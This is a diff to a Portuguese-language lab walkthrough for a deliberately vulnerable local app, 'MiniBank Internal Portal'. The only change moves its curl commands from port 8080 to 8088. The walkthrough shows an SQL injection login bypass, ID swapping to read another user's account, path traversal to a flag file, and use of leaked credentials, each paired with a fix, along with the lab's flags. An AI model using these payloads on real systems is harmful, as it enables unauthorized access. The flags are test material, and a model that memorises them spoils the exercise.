@@ -29,14 +29,14 @@ sudo docker compose up --build
 
 O esperado e iniciar:
 
-- aplicacao web em `http://localhost:8080`
+- aplicacao web em `http://localhost:8088`
 - MySQL apenas na rede interna do Docker Compose
 - somente a porta `8080` exposta no host
 
 Valide a home:
 
 ```bash
-curl -i http://localhost:8080
+curl -i http://localhost:8088
 ```
 
 Voce deve receber HTTP `200 OK` e HTML com **MiniBank Internal Portal**.
@@ -46,9 +46,9 @@ Voce deve receber HTTP `200 OK` e HTML com **MiniBank Internal Portal**.
 Antes de explorar, observe. A primeira habilidade a treinar e encontrar pistas sem chute.
 
 ```bash
-curl -i http://localhost:8080
-curl -s http://localhost:8080 | head
-curl -s http://localhost:8080 | grep -i "admin\|robots\|backup\|dev\|status"
+curl -i http://localhost:8088
+curl -s http://localhost:8088 | head
+curl -s http://localhost:8088 | grep -i "admin\|robots\|backup\|dev\|status"
 ```
 
 O que observar:
@@ -62,7 +62,7 @@ O que observar:
 Teste uma rota inexistente para entender o padrao de erro:
 
 ```bash
-curl -i http://localhost:8080/nao-existe
+curl -i http://localhost:8088/nao-existe
 ```
 
 ## 3. Comentario HTML
@@ -70,7 +70,7 @@ curl -i http://localhost:8080/nao-existe
 Visualize o codigo-fonte e procure comentarios:
 
 ```bash
-curl -s http://localhost:8080 | grep -i "<!--"
+curl -s http://localhost:8088 | grep -i "<!--"
 ```
 
 Comentario esperado:
@@ -90,7 +90,7 @@ Correcao: remover comentarios operacionais do HTML entregue ao cliente.
 O comentario sugere verificar `robots.txt`.
 
 ```bash
-curl -i http://localhost:8080/robots.txt
+curl -i http://localhost:8088/robots.txt
 ```
 
 Conteudo esperado:
@@ -119,13 +119,13 @@ Rotas descobertas:
 Acesse a rota descoberta:
 
 ```bash
-curl -i http://localhost:8080/status
+curl -i http://localhost:8088/status
 ```
 
 Com `jq`, se disponivel:
 
 ```bash
-curl -s http://localhost:8080/status | jq
+curl -s http://localhost:8088/status | jq
 ```
 
 O retorno revela informacoes como:
@@ -150,7 +150,7 @@ Correcao: endpoints publicos de status devem retornar apenas informacao minima, 
 O `robots.txt` revelou `/dev.txt`. Acesse:
 
 ```bash
-curl -i http://localhost:8080/dev.txt
+curl -i http://localhost:8088/dev.txt
 ```
 
 O arquivo contem a credencial:
@@ -168,8 +168,8 @@ FLAG{credencial_exposta_capturada}
 Valide o impacto usando a credencial em `/backup`:
 
 ```bash
-curl -i http://localhost:8080/backup
-curl -i -u backup_user:backup123 http://localhost:8080/backup
+curl -i http://localhost:8088/backup
+curl -i -u backup_user:backup123 http://localhost:8088/backup
 ```
 
 Sem credencial, o esperado e HTTP `401`. Com `backup_user:backup123`, o esperado e HTTP `200 OK` com listagem de relatorios.
@@ -194,13 +194,13 @@ A rota de login usa MySQL. Primeiro valide comportamento normal:
 ```bash
 curl -i -c joao.cookies \
   -d "username=joao&password=joao123" \
-  http://localhost:8080/login
+  http://localhost:8088/login
 ```
 
 Confirme o dashboard:
 
 ```bash
-curl -s -b joao.cookies http://localhost:8080/dashboard | grep -i "joao\|employee\|contas"
+curl -s -b joao.cookies http://localhost:8088/dashboard | grep -i "joao\|employee\|contas"
 ```
 
 Agora valide falha de login:
@@ -208,7 +208,7 @@ Agora valide falha de login:
 ```bash
 curl -i \
   -d "username=admin&password=senha_errada" \
-  http://localhost:8080/login
+  http://localhost:8088/login
 ```
 
 O ponto vulneravel e a concatenacao direta de `username` e `password` na query SQL.
@@ -228,13 +228,13 @@ Com `curl`:
 curl -i -c admin.cookies \
   --data-urlencode "username=admin' OR '1'='1' -- " \
   --data-urlencode "password=qualquercoisa" \
-  http://localhost:8080/login
+  http://localhost:8088/login
 ```
 
 Valide a flag no dashboard:
 
 ```bash
-curl -s -b admin.cookies http://localhost:8080/dashboard | grep -i "FLAG"
+curl -s -b admin.cookies http://localhost:8088/dashboard | grep -i "FLAG"
 ```
 
 Flag:
@@ -262,19 +262,19 @@ Faca login como Joao:
 ```bash
 curl -i -c joao.cookies \
   -d "username=joao&password=joao123" \
-  http://localhost:8080/login
+  http://localhost:8088/login
 ```
 
 Acesse uma conta do Joao:
 
 ```bash
-curl -s -b joao.cookies http://localhost:8080/account/1 | grep -i "Joao\|Conta\|Nota"
+curl -s -b joao.cookies http://localhost:8088/account/1 | grep -i "Joao\|Conta\|Nota"
 ```
 
 Troque apenas o ID para a conta de Maria:
 
 ```bash
-curl -s -b joao.cookies http://localhost:8080/account/2 | grep -i "Maria\|FLAG\|Nota"
+curl -s -b joao.cookies http://localhost:8088/account/2 | grep -i "Maria\|FLAG\|Nota"
 ```
 
 Flag:
@@ -302,13 +302,13 @@ Correcao:
 O `robots.txt` revelou `/download`. Teste primeiro um arquivo esperado:
 
 ```bash
-curl -i "http://localhost:8080/download?file=public-info.txt"
+curl -i "http://localhost:8088/download?file=public-info.txt"
 ```
 
 Depois teste o traversal controlado:
 
 ```bash
-curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
+curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
 ```
 
 Flag:
@@ -350,12 +350,12 @@ Correcao:
 Com a aplicacao em execucao:
 
 ```bash
-curl -i http://localhost:8080
-curl -i http://localhost:8080/status
-curl -i http://localhost:8080/robots.txt
-curl -i http://localhost:8080/dev.txt
-curl -i "http://localhost:8080/download?file=public-info.txt"
-curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
+curl -i http://localhost:8088
+curl -i http://localhost:8088/status
+curl -i http://localhost:8088/robots.txt
+curl -i http://localhost:8088/dev.txt
+curl -i "http://localhost:8088/download?file=public-info.txt"
+curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
 ```
 
 Valide as flags no repositorio usando o comando documentado em `../VALIDATION.md`.
